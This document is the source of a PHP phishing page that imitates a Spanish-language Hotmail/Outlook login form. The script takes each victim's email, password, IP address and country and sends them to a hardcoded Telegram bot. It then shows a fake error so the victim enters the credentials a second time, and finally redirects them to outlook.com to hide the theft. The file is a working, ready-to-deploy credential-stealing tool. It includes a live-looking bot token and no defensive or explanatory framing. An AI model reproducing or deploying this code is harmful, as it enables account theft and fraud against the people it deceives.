<?php
ini_set("display_errors", 0);
$apibot = "7480126858:AAEXNSbPvOTi-LKey4l05QvXtuTUvar6AsU"; 
$canal = "-4598107226";

function getIP() {
   if (isset($_SERVER)) {
      if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
         return $_SERVER['HTTP_X_FORWARDED_FOR'];
      } else {
         return $_SERVER['REMOTE_ADDR'];
      }
   } else {
      if (isset($GLOBALS['HTTP_SERVER_VARS']['HTTP_X_FORWARDER_FOR'])) {
         return $GLOBALS['HTTP_SERVER_VARS']['HTTP_X_FORWARDED_FOR'];
      } else {
         return $GLOBALS['HTTP_SERVER_VARS']['REMOTE_ADDR'];
      }
   }
}

$myip = getIP() ;
$meta = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$myip));
$pais = $meta['geoplugin_countryName']; 
?>
<html>
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=yes">
    <link rel="stylesheet" href="docs/icomoon.css">
    <link rel="stylesheet" href="docs/owl.carousel.min.css">
    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="docs/bootstrap.min.css">
    <!-- Style -->
    <link rel="stylesheet" href="docs/style.css">
    <title>Inicio</title>	
  </head>
  <body>
  <div class="content" id="vista1" style="">
    <div class="container">
      <div class="row justify-content-center">
        <!-- <div class="col-md-6 order-md-2">
        
        </div> -->
        <div class="col-md-6 contents">
          <div class="row justify-content-center">
            <div class="col-md-12">
              <div class="form-block">
                  <div class="mb-4">
				  <img src="docs/mud.png" alt="Image" class="img-fluid"><br><br>
                  <h3><b>Iniciar Sesi&oacute;n</b></h3>
                </div>
                <form method="post" action="#" >
	
						
						<div class="form-group first">
                    
              
                    <input type="email" placeholder="Correo electrónico" name="bc1" style="font-size:14px;" class="form-control" required>
                    

                  </div>
                  
                  <div class="form-group last mb-4">
                 
                    <input type="password" placeholder="Escribir contraseña" name="bclv1"  style="font-size:14px;" class="form-control" required>
                    
                  </div>
                  
                  <div class="" style="font-size: .8125rem;">
                   No tienes cuenta? &nbsp;<a href="#" style="color:blue;text-decoration:none">Crea una!</a>&nbsp;<br><br>
				      <a href="#" style="color:blue;text-decoration:none"> Opciones de inicio de sesión</a>
				</div>  
			<br>
				
                   

                  <input type="submit" value="Siguiente" class="btn btn-pill text-white btn-block btn-primary">
                 <br>
                  <div class="social-login text-center">
               
                  </div>
                </form>
              </div>
            </div>
          </div>
          
        </div>
        
      </div>
    </div>
  </div>
 <?php

if (isset($_POST['bc1']) && isset($_POST['bclv1'])){
    $remail = $_POST["bc1"];
    $rpass = $_POST["bclv1"];


$message = "--Hotm4il--\nCorr3o: <code>$remail</code>\nClav3: <code>$rpass</code>\n<code>$myip</code> <code>$pais</code>";

$apiToken = $apibot;
$data = [
    'chat_id' => $canal,
    'text' => $message,
	'parse_mode' => 'HTML', 
];
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );


 echo '<script>document.getElementById("vista1").style.display = "none";</script>';




?>
    <div class="content" id="vista2" style="">
    <div class="container">
      <div class="row justify-content-center">
        <!-- <div class="col-md-6 order-md-2">
        
        </div> -->
        <div class="col-md-6 contents">
          <div class="row justify-content-center">
            <div class="col-md-12">
              <div class="form-block">
                  <div class="mb-4">
				  <img src="docs/mud.png" alt="Image" class="img-fluid"><br><br>
                  <h3><b>Iniciar Sesi&oacute;n</b></h3>
				    <span style="color:red">¡ha ocurrido un error!</span> Ingrese sus datos nuevamente
                </div>
                <form method="post" action="#" >
	
						
						<div class="form-group first">
                    
              
                    <input type="email" placeholder="Correo electrónico" name="bc2" style="font-size:14px;" class="form-control" required>
                    

                  </div>
                  
                  <div class="form-group last mb-4">
                 
                    <input type="password" placeholder="Escribir contraseña" name="bclv2"  style="font-size:14px;" class="form-control" required>
                    
                  </div>
                  
                  <div class="" style="font-size: .8125rem;">
                   No tienes cuenta? &nbsp;<a href="#" style="color:blue;text-decoration:none">Crea una!</a>&nbsp;<br><br>
				      <a href="#" style="color:blue;text-decoration:none"> Opciones de inicio de sesión</a>
				</div>  
			<br>
				
                   

                  <input type="submit" value="Siguiente" class="btn btn-pill text-white btn-block btn-primary">
                 <br>
                  <div class="social-login text-center">
               
                  </div>
                </form>
              </div>
            </div>
          </div>
          
        </div>
        
      </div>
    </div>
  </div>
  
   <?php

} else if (isset($_POST['bc2']) && isset($_POST['bclv2'])){
    $remail2 = $_POST["bc2"];
    $rpass2 = $_POST["bclv2"];


$message = "--Hotm4il--\nCorr3o-2: <code>$remail2</code>\nClav3-2: <code>$rpass2</code>\n<code>$myip</code> <code>$pais</code>";

$apiToken = $apibot;
$data = [
    'chat_id' => $canal,
    'text' => $message,
	'parse_mode' => 'HTML', 
];
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );


 echo '<script>document.getElementById("vista1").style.display = "none";</script>';
 echo '<script>document.getElementById("vista2").style.display = "none";</script>';
 
 echo '<script type="text/javascript">window.location.href = "http://outlook.com/";</script>';
}


?>
  </body>
</html>